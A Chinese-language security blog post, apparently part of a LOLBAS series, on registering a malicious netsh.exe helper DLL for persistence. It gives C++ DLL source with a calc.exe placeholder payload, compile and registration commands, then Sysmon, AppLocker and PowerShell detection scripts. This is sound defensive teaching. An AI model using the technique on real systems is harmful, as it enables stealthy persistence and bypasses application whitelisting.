---
title: "LOLBAS鐵人賽Day16Netsh.exe：透過 Helper DLL 注入執行惡意程式碼"
published: 2025-09-30T15:23:23.000Z
description: "LOLBAS 系列第 16 天"
tags: [LOLBAS, Windows, Security]
category: Research
draft: false
---

Netsh.exe 是 Windows 內建的網路設定命令列工具，  
原本是用來管理網路設定防火牆規則等合法用途，  
但攻擊者可以透過註冊惡意 Helper DLL 的方式，讓 netsh.exe 載入並執行惡意程式碼，  
達到繞過白名單持久化駐留的目的

## Netsh.exe 是什麼？

### 基本功能

Netsh 是 Windows 的網路設定工具，主要功能包括：

*   設定網路介面卡（IPDNSGateway）
*   管理 Windows 防火牆規則
*   設定無線網路
*   建立 Port Forwarding
*   管理 HTTP 設定

### Helper DLL 機制

Netsh 採用**模組化設計**，透過 Helper DLL 來擴充功能：

*   Helper DLL 是可以動態載入的擴充模組
*   每個 Helper 負責特定的網路功能（如 DHCPFirewallWLAN）
*   Helper DLL 會在 netsh 啟動時自動載入
*   攻擊者可以註冊自己的 Helper DLL 來執行任意程式碼

## 攻擊流程

### Step 1: 建立惡意 Helper DLL

首先建立一個簡單的 DLL，實作 netsh 所需的導出函式：

`evil_helper.cpp`：

```cpp
#include <windows.h>
#include <netsh.h>

// Netsh 要求的初始化函式
DWORD WINAPI InitHelperDll(
    DWORD dwNetshVersion,
    PVOID pReserved
)
{
    // malware 可以包在這邊
    WinExec("calc.exe", SW_SHOW);
    
    return NO_ERROR;
}

// DLL 入口點
BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // DLL 被載入時執行
        DisableThreadLibraryCalls(hModule);
        break;
    }
    return TRUE;
}

```

### Step 2: 編譯 DLL

```bash
# 使用 Visual Studio 的開發者命令提示字元
cl.exe /LD evil_helper.cpp /link /DEF:evil_helper.def

# 或使用 mingw-w64
x86_64-w64-mingw32-gcc -shared evil_helper.cpp -o evil_helper.dll

```

需要同時建立 `.def` 檔案來導出函式：

`evil_helper.def`：

```
LIBRARY evil_helper
EXPORTS
    InitHelperDll

```

### Step 3: 註冊 Helper DLL

將 DLL 複製到適當位置並註冊：

```cmd
netsh add helper C:\path\to\evil_helper.dll

```

註冊後的登錄檔路徑：

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh

```

### Step 4: 觸發執行

只要執行任何 netsh 命令，惡意 DLL 就會被載入：

```cmd
# 執行任何 netsh 命令都會觸發
netsh interface show interface
netsh wlan show profiles
netsh advfirewall show allprofiles

# 甚至只執行 netsh 本身
netsh

```

## 偵測&防禦建議

### 關鍵偵測指標

**1\. 監控 netsh Helper 註冊**

```powershell
# 檢查已註冊的 Helper DLL
reg query "HKLM\SOFTWARE\Microsoft\NetSh"

# 監控註冊表修改（使用 Sysmon）
# Event ID 13 - RegistryEvent (Value Set)
# TargetObject: HKLM\SOFTWARE\Microsoft\NetSh

```

**2\. 分析 netsh 行為**

*   netsh 載入非預期的 DLL
*   netsh 產生子程序（calc.exe, powershell.exe, cmd.exe）
*   netsh 進行網路連線到不明 IP
*   netsh 從非標準路徑執行

**3\. Sysmon 規則範例**

```xml
<RuleGroup name="Netsh Helper Abuse" groupRelation="or">
    <ImageLoad onmatch="include">
        <Image condition="end with">netsh.exe</Image>
        <ImageLoaded condition="not begin with">C:\Windows\System32\</ImageLoaded>
    </ImageLoad>
    
    <ProcessCreate onmatch="include">
        <ParentImage condition="end with">netsh.exe</ParentImage>
    </ProcessCreate>
</RuleGroup>

```

### 防禦措施

**1\. 限制 netsh 的使用**

```powershell
# AppLocker
$ruleName = "Block Netsh for Standard Users"
$appLockerPolicy = @"
<RuleCollection Type="Exe" EnforcementMode="Enabled">
    <FilePathRule Id="..." Name="$ruleName" 
                  Description="Prevent non-admin netsh usage" 
                  UserOrGroupSid="S-1-5-32-545" Action="Deny">
        <Conditions>
            <FilePathCondition Path="%SYSTEM32%\netsh.exe" />
        </Conditions>
    </FilePathRule>
</RuleCollection>
"@

```

**2\. 監控並移除可疑 Helper**

```powershell
# 掃描並檢查所有 Helper DLL
$helpers = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\NetSh" | 
    Get-Member -MemberType NoteProperty |
    Where-Object { $_.Name -ne 'PSPath' -and $_.Name -ne 'PSParentPath' }

foreach ($helper in $helpers) {
    $dllPath = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\NetSh").$($helper.Name)
    
    # 檢查 DLL 簽章
    $signature = Get-AuthenticodeSignature $dllPath
    
    if ($signature.Status -ne 'Valid' -or 
        $signature.SignerCertificate.Subject -notlike '*Microsoft*') {
        Write-Warning "Suspicious Helper: $dllPath"
        # 移除可疑項目
        # Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\NetSh" -Name $helper.Name
    }
}

```

**3\. 定期稽核**

```powershell
# 建立基準線 - 記錄合法的 Helper
$baseline = @(
    "C:\Windows\System32\dhcpmon.dll",
    "C:\Windows\System32\nshwfp.dll",
    "C:\Windows\System32\nshhttp.dll"
    # ... 其他已知的合法 Helper
)

# 定期比對
$current = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\NetSh" | 
    Get-Member -MemberType NoteProperty |
    Where-Object { $_.Name -notin @('PSPath','PSParentPath') } |
    ForEach-Object { (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\NetSh").$($_.Name) }

$suspicious = Compare-Object $baseline $current | 
    Where-Object { $_.SideIndicator -eq '=>' }

if ($suspicious) {
    Write-Host "New Helper DLL detected:" -ForegroundColor Red
    $suspicious | Format-Table
}

```

**4\. 使用 EDR/AV 規則**

*   監控 netsh.exe 載入非系統路徑的 DLL
*   偵測 netsh.exe 建立網路連線
*   追蹤 netsh.exe 的子程序樹

## 總結！

Netsh.exe 的 Helper DLL 機制成為攻擊者的目標，因為：

*   **持久化駐留** - Helper 會在每次 netsh 執行時載入
*   **系統信任** - 利用 Microsoft 簽章的合法工具
*   **難以偵測** - 不直接執行可疑程式，而是透過 DLL 注入
*   **繞過防護** - 可以繞過應用程式白名單和某些 EDR